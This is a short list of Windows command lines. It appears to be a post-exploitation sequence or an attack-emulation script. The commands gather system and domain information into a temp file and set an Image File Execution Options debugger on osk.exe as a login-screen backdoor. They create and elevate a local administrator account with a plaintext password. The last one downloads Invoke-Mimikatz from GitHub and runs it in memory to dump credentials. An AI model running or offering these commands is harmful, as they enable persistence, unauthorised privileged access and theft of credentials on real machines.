cmd.exe /c "whoami"

cmd.exe /c "ping -n 1 8.8.8.8"

cmd.exe /c "netstat -rn >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "systeminfo >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "net group "Domain Admins" /domain >> C:\Users\Demo\AppData\Local\Temp\a.txt"

cmd.exe /c "reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f"

cmd.exe /c "net user rickflair natureb0y /add"

cmd.exe /c "net localgroup Administrators rickflair /add"

cmd.exe /c "tracert -d systemlowcheck.com"

cmd.exe /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
